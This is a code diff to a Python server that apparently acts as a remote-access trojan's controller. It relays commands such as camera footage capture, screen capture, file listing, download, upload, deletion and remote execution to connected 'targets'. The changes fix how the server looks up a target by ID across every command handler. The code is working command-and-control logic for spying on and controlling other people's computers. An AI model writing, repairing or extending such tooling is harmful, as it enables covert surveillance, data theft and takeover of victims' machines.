@@ -168,15 +168,19 @@ ID: {targets_list[g]["id"]}
 
             elif command == 'GET_CAMERA_FOOTAGE':
                 target_id = cs.recv(1024).decode('utf-8')
+                found = False
 
                 for j in range(0, len(targets_list)):
                     if target_id == targets_list[j]['id']:
                         ts = targets_list[j]['socket']
+                        found = True
 
-                    else:
+                if found == False:
                         print("[COMMAND] Requested target is offline.")
                         cs.send(bytes('TARGET_OFFLINE','utf-8'))
                         break
+                
+                found = False
 
                 try:
                     ts.send(bytes('GET_CAMERA_FOOTAGE','utf-8'))
@@ -219,15 +223,19 @@ ID: {targets_list[g]["id"]}
 
             elif command == 'GET_SCREEN_CAPTURE':
                 target_id = cs.recv(1024).decode('utf-8')
+                found = False
 
                 for j in range(0, len(targets_list)):
                     if target_id == targets_list[j]['id']:
                         ts = targets_list[j]['socket']
+                        found = True
 
-                    else:
+                if found == False:
                         print("[COMMAND] Requested target is offline.")
                         cs.send(bytes('TARGET_OFFLINE','utf-8'))
                         break
+                
+                found = False
 
                 try:
                     ts.send(bytes('GET_SCREEN_CAPTURE','utf-8'))
@@ -270,15 +278,19 @@ ID: {targets_list[g]["id"]}
 
             elif command == 'GET_FILES':
                 target_id = cs.recv(300).decode('utf-8')
+                found = False
 
                 for j in range(0, len(targets_list)):
                     if target_id == targets_list[j]['id']:
                         ts = targets_list[j]['socket']
+                        found = True
 
-                    else:
+                if found == False:
                         print("[COMMAND] Requested target is offline.")
                         cs.send(bytes('TARGET_OFFLINE','utf-8'))
                         break
+                
+                found = False
 
                 try:
                     ts.send(bytes('GET_FILES','utf-8'))
@@ -299,15 +311,19 @@ ID: {targets_list[g]["id"]}
             
             elif command == 'DOWNLOAD_FILE':
                 target_id = cs.recv(300).decode('utf-8')
+                found = False
 
                 for j in range(0, len(targets_list)):
                     if target_id == targets_list[j]['id']:
                         ts = targets_list[j]['socket']
+                        found = True
 
-                    else:
+                if found == False:
                         print("[COMMAND] Requested target is offline.")
                         cs.send(bytes('TARGET_OFFLINE','utf-8'))
                         break
+                
+                found = False
 
 
                 try:
@@ -344,17 +360,19 @@ ID: {targets_list[g]["id"]}
 
             elif command == 'UPLOAD':
                 target_id = cs.recv(300).decode('utf-8')
+                found = False
 
                 for j in range(0, len(targets_list)):
                     if target_id == targets_list[j]['id']:
                         ts = targets_list[j]['socket']
+                        found = True
 
-                    else:
+                if found == False:
                         print("[COMMAND] Requested target is offline.")
                         cs.send(bytes('TARGET_OFFLINE','utf-8'))
                         break
-
-
+                
+                found = False
                 try:
                     ts.send(bytes('UPLOAD','utf-8'))
 
@@ -382,16 +400,19 @@ ID: {targets_list[g]["id"]}
 
             elif command == 'DELETE':
                 target_id = cs.recv(300).decode('utf-8')
+                found = False
 
                 for j in range(0, len(targets_list)):
                     if target_id == targets_list[j]['id']:
                         ts = targets_list[j]['socket']
+                        found = True
 
-                    else:
+                if found == False:
                         print("[COMMAND] Requested target is offline.")
                         cs.send(bytes('TARGET_OFFLINE','utf-8'))
                         break
-
+                
+                found = False
 
                 try:
                     ts.send(bytes('DELETE','utf-8'))
@@ -414,10 +435,19 @@ ID: {targets_list[g]["id"]}
             
             elif command == 'RUN':
                 target_id = cs.recv(300).decode('utf-8')
+                found = False
 
                 for j in range(0, len(targets_list)):
                     if target_id == targets_list[j]['id']:
                         ts = targets_list[j]['socket']
+                        found = True
+
+                if found == False:
+                        print("[COMMAND] Requested target is offline.")
+                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
+                        break
+                
+                found = False
 
                 try:
                     ts.send(bytes('RUN','utf-8'))
@@ -435,8 +465,6 @@ ID: {targets_list[g]["id"]}
                 confirm = ts.recv(100)
                 cs.send(confirm)
 
-                
-
                 if confirm.decode('utf-8') == 'INVALID':
                     break
             
@@ -446,16 +474,19 @@ ID: {targets_list[g]["id"]}
 
             elif command == 'GET_TARGET_DETAILS':
                 target_id = cs.recv(300).decode('utf-8')
+                found = False
 
                 for j in range(0, len(targets_list)):
                     if target_id == targets_list[j]['id']:
                         ts = targets_list[j]['socket']
+                        found = True
 
-                    else:
+                if found == False:
                         print("[COMMAND] Requested target is offline.")
                         cs.send(bytes('TARGET_OFFLINE','utf-8'))
                         break
-
+                
+                found = False
 
                 try:
                     ts.send(bytes('GET_TARGET_DETAILS','utf-8'))
